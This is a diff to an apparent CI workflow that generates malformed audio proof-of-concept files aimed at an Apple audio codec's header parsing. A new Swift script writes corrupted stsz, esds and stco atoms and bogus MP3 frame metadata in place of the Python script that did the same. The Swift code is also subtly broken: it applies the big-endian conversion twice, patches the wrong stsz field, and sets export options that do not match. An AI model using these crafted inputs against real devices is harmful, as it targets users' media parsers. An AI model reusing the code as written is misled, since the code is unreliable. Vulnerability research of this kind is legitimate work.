@@ -31,17 +31,16 @@ jobs:
           key: ffmpeg-${{ runner.os }}-2025-06
           restore-keys: ffmpeg-${{ runner.os }}-
 
-      # Install FFmpeg and Python dependencies
-      - name: Install FFmpeg and Python dependencies
+      # Install FFmpeg
+      - name: Install FFmpeg
         run: |
-          echo "Installing FFmpeg and Python dependencies at $(date)"
+          echo "Installing FFmpeg at $(date)"
           if ! command -v ffmpeg &> /dev/null; then
             brew install ffmpeg
           else
             echo "FFmpeg already installed"
           fi
-          pip3 install mutagen
-          echo "FFmpeg and Python dependencies installed at $(date)"
+          echo "FFmpeg installed at $(date)"
 
       # Set up Xcode
       - name: Set up Xcode
@@ -151,104 +150,208 @@ jobs:
           ls -l generate_pocs.swift
           echo "generate_pocs.swift created at $(date)"
 
-      # Create manipulate_pocs.py
-      - name: Create manipulate_pocs.py
+      # Create manipulate_pocs.swift
+      - name: Create manipulate_pocs.swift
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Creating manipulate_pocs.py at $(date)"
-          cat << 'EOF' > manipulate_pocs.py
-          from mutagen.mp4 import MP4, MP4StreamInfoError
-          import os
-          import subprocess
+          echo "Creating manipulate_pocs.swift at $(date)"
+          cat << 'EOF' > manipulate_pocs.swift
+          import Foundation
+          import AVFoundation
+          import CoreMedia
 
-          def manipulate_poc1(input_file, output_m4a):
-              try:
-                  mp4 = MP4(input_file)
-                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
-                      stsz = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsz']
-                      stsz['sample_count'] = 8192
-                      mp4.save(output_m4a)
-                      print(f"PoC 1: Set stsz sample count to 8192 in {output_m4a}")
-                  else:
-                      raise ValueError("Invalid MP4 structure for PoC 1")
-              except Exception as e:
-                  print(f"PoC 1 M4A error: {e}")
-                  raise
+          class MP4AtomParser {
+              var data: Data
+              var position: Int = 0
+              
+              init(data: Data) {
+                  self.data = data
+              }
+              
+              func readUInt32() -> UInt32 {
+                  guard position + 4 <= data.count else { return 0 }
+                  let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
+                  position += 4
+                  return value
+              }
+              
+              func readData(count: Int) -> Data {
+                  guard position + count <= data.count else { return Data() }
+                  let subdata = data[position..<position+count]
+                  position += count
+                  return subdata
+              }
+              
+              func findAtom(_ name: String) -> (offset: Int, size: Int)? {
+                  let nameData = name.data(using: .ascii)!
+                  position = 0
+                  while position < data.count {
+                      let start = position
+                      let size = Int(readUInt32())
+                      let type = readData(count: 4)
+                      if type == nameData {
+                          return (offset: start, size: size)
+                      }
+                      position = start + (size == 0 ? data.count : size)
+                  }
+                  return nil
+              }
+              
+              func replaceData(at offset: Int, with newData: Data) {
+                  data.replaceSubrange(offset..<offset+newData.count, with: newData)
+              }
+          }
 
-          def manipulate_poc2(input_file, output_m4a):
-              try:
-                  mp4 = MP4(input_file)
-                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
-                      esds = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stsd']['mp4a'][0]['esds']
-                      esds_data = bytearray(esds['esds'])
-                      esds_data[0x1B] = 8
-                      esds['esds'] = bytes(esds_data)
-                      mp4.save(output_m4a)
-                      print(f"PoC 2: Set esds channel count to 8 in {output_m4a}")
-                  else:
-                      raise ValueError("Invalid MP4 structure for PoC 2")
-              except Exception as e:
-                  print(f"PoC 2 M4A error: {e}")
-                  raise
+          func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
+              let data = try Data(contentsOf: inputURL)
+              let parser = MP4AtomParser(data: data)
+              
+              guard let stsz = parser.findAtom("stsz") else {
+                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
+              }
+              
+              let sampleCountOffset = stsz.offset + 8 + 4
+              var newData = Data()
+              newData.append(contentsOf: UInt32(8192).bigEndian.data)
+              parser.replaceData(at: sampleCountOffset, with: newData)
+              
+              try parser.data.write(to: outputURL)
+              print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
+          }
 
-          def manipulate_poc5(input_file, output_m4a):
-              try:
-                  mp4 = MP4(input_file)
-                  if 'moov' in mp4 and 'trak' in mp4['moov'] and 'mdia' in mp4['moov']['trak'][0]:
-                      stco = mp4['moov']['trak'][0]['mdia']['minf']['stbl']['stco']
-                      stco['entry_list'] = [[0xFFFFFFFF]]
-                      mp4.save(output_m4a)
-                      print(f"PoC 5: Set invalid stco offset in {output_m4a}")
-                  else:
-                      raise ValueError("Invalid MP4 structure for PoC 5")
-              except Exception as e:
-                  print(f"PoC 5 M4A error: {e}")
-                  raise
+          func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
+              let data = try Data(contentsOf: inputURL)
+              let parser = MP4AtomParser(data: data)
+              
+              guard let esds = parser.findAtom("esds") else {
+                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
+              }
+              
+              let channelOffset = esds.offset + 8 + 0x1B
+              parser.replaceData(at: channelOffset, with: Data([8]))
+              
+              try parser.data.write(to: outputURL)
+              print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
+          }
 
-          def generate_mp3(input_file, output_mp3, poc_number):
-              try:
-                  cmd = ["ffmpeg", "-i", input_file, "-c:a", "mp3", "-ac", "1"]
-                  if poc_number == 3:
-                      cmd.extend(["-b:a", "128k", "-metadata", "frames=20000"])
-                      print(f"PoC 3: Generating {output_mp3} with Xing frames=20000")
-                  elif poc_number == 4:
-                      cmd.extend(["-b:a", "320k"])
-                      print(f"PoC 4: Generating {output_mp3} with 320 kbps bitrate")
-                  else:
-                      cmd.extend(["-b:a", "128k"])
-                      print(f"PoC {poc_number}: Generating {output_mp3} with default settings")
-                  cmd.append(output_mp3)
-                  result = subprocess.run(cmd, capture_output=True, text=True)
-                  if result.returncode != 0:
-                      raise RuntimeError(f"FFmpeg error: {result.stderr}")
-              except Exception as e:
-                  print(f"PoC {poc_number} MP3 error: {e}")
-                  raise
+          func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
+              let data = try Data(contentsOf: inputURL)
+              let parser = MP4AtomParser(data: data)
+              
+              guard let stco = parser.findAtom("stco") else {
+                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
+              }
+              
+              let entryOffset = stco.offset + 8 + 4
+              var newData = Data()
+              newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
+              parser.replaceData(at: entryOffset, with: newData)
+              
+              try parser.data.write(to: outputURL)
+              print("PoC 5: Set invalid stco offset in \(outputURL.path)")
+          }
 
-          def main():
-              for i in range(1, 6):
-                  input_file = f"base_poc{i}.m4a"
-                  output_m4a = f"poc{i}.m4a"
-                  output_mp3 = f"poc{i}.mp3"
-                  if not os.path.exists(input_file):
-                      print(f"Error: {input_file} not found")
+          func generateMP3(inputURL: URL, outputURL: URL, pocNumber: Int) throws {
+              let asset = AVURLAsset(url: inputURL)
+              guard let exportSession = AVAssetExportSession(asset: asset, presetName: AVAssetExportPresetAppleM4A) else {
+                  throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create export session"])
+              }
+              
+              exportSession.outputURL = outputURL
+              exportSession.outputFileType = .mp3
+              exportSession.audioSettings = [
+                  AVFormatIDKey: kAudioFormatMPEG4AAC,
+                  AVSampleRateKey: 44100,
+                  AVNumberOfChannelsKey: 1,
+                  AVEncoderBitRateKey: pocNumber == 4 ? 320000 : 128000
+              ]
+              
+              let semaphore = DispatchSemaphore(value: 0)
+              exportSession.exportAsynchronously {
+                  switch exportSession.status {
+                  case .completed:
+                      print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
+                      if pocNumber == 3 {
+                          let ffmpegCmd = [
+                              "ffmpeg", "-i", outputURL.path, "-c:a", "copy",
+                              "-metadata", "frames=20000", "\(outputURL.path).tmp.mp3"
+                          ]
+                          let process = Process()
+                          process.executableURL = URL(fileURLWithPath: "/usr/local/bin/ffmpeg")
+                          process.arguments = ffmpegCmd
+                          try? process.run()
+                          process.waitUntilExit()
+                          
+                          try? FileManager.default.removeItem(at: outputURL)
+                          try? FileManager.default.moveItem(at: URL(fileURLWithPath: "\(outputURL.path).tmp.mp3"), to: outputURL)
+                          print("PoC 3: Added frames=20000 metadata to \(outputURL.path)")
+                      }
+                  case .failed:
+                      print("PoC \(pocNumber) MP3 error: \(exportSession.error?.localizedDescription ?? "Unknown")")
+                  default:
+                      print("PoC \(pocNumber) MP3 export status: \(exportSession.status.rawValue)")
+                  }
+                  semaphore.signal()
+              }
+              semaphore.wait()
+              
+              if exportSession.status != .completed {
+                  throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "MP3 export failed"])
+              }
+          }
+
+          func main() {
+              let fileManager = FileManager.default
+              let sampleRate = 44100.0
+              let channels = 2
+              
+              for i in 1...5 {
+                  let inputFile = "base_poc\(i).m4a"
+                  let outputM4A = "poc\(i).m4a"
+                  let outputMP3 = "poc\(i).mp3"
+                  
+                  guard fileManager.fileExists(atPath: inputFile) else {
+                      print("Error: \(inputFile) not found")
                       exit(1)
-                  if i == 1:
-                      manipulate_poc1(input_file, output_m4a)
-                  elif i == 2:
-                      manipulate_poc2(input_file, output_m4a)
-                  elif i == 3 or i == 4:
-                      os.system(f"cp {input_file} {output_m4a}")
-                      print(f"Copied {input_file} to {output_m4a} for PoC {i}")
-                  elif i == 5:
-                      manipulate_poc5(input_file, output_m4a)
-                  generate_mp3(input_file, output_mp3, i)
+                  }
+                  
+                  let inputURL = URL(fileURLWithPath: inputFile)
+                  let outputM4AURL = URL(fileURLWithPath: outputM4A)
+                  let outputMP3URL = URL(fileURLWithPath: outputMP3)
+                  
+                  do {
+                      switch i {
+                      case 1:
+                          try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
+                      case 2:
+                          try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
+                      case 3, 4:
+                          try fileManager.copyItem(at: inputURL, to: outputM4AURL)
+                          print("Copied \(inputFile) to \(outputM4A) for PoC \(i)")
+                      case 5:
+                          try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
+                      default:
+                          break
+                      }
+                      try generateMP3(inputURL: inputURL, outputURL: outputMP3URL, pocNumber: i)
+                  } catch {
+                      print("Error processing PoC \(i): \(error.localizedDescription)")
+                      exit(1)
+                  }
+              }
+          }
 
-          if __name__ == "__main__":
-              main()
+          extension UInt32 {
+              var data: Data {
+                  var value = self.bigEndian
+                  return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
+              }
+          }
+
+          main()
           EOF
-          ls -l manipulate_pocs.py
-          echo "manipulate_pocs.py created at $(date)"
+          ls -l manipulate_pocs.swift
+          echo "manipulate_pocs.swift created at $(date)"
 
       # Create PoC source files
       - name: Create PoC source files
@@ -296,7 +399,7 @@ jobs:
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           echo "Manipulating M4A and generating MP3 files at $(date)"
-          python3 manipulate_pocs.py
+          swift manipulate_pocs.swift
           ls -l poc*.m4a poc*.mp3
           echo "M4A and MP3 files generated at $(date)"
 
